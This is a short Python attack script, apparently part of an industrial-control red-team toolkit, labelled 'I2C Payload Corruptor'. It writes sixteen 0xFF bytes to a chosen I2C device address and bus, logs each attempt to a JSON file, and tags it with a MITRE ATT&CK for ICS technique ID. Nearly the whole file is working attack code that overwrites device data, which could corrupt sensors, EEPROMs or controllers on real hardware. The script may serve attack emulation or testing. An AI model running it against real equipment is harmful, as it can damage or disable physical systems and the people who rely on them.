#!/usr/bin/env python3

import time, json, argparse, os
from smbus2 import SMBus, i2c_msg
from datetime import datetime

LOG_FILE = "results/i2c_corruptor_logs.json"
MITRE_TTP = "T0830.002"

def log_result(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            existing = json.load(f)
    else:
        existing = []
    existing.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(existing, f, indent=2)

def corrupt_i2c(address=0x48, bus_id=1):
    try:
        with SMBus(bus_id) as bus:
            data = [0xFF] * 16
            msg = i2c_msg.write(address, data)
            bus.i2c_rdwr(msg)
        return True
    except Exception as e:
        print(f"[!] I2C corruption failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="I2C Payload Corruptor")
    parser.add_argument("--address", type=lambda x: int(x, 0), default="0x48", help="I2C address")
    parser.add_argument("--bus", type=int, default=1, help="I2C bus number")
    args = parser.parse_args()

    success = corrupt_i2c(args.address, args.bus)
    log_result({
        "timestamp": datetime.utcnow().isoformat(),
        "address": hex(args.address),
        "bus": args.bus,
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
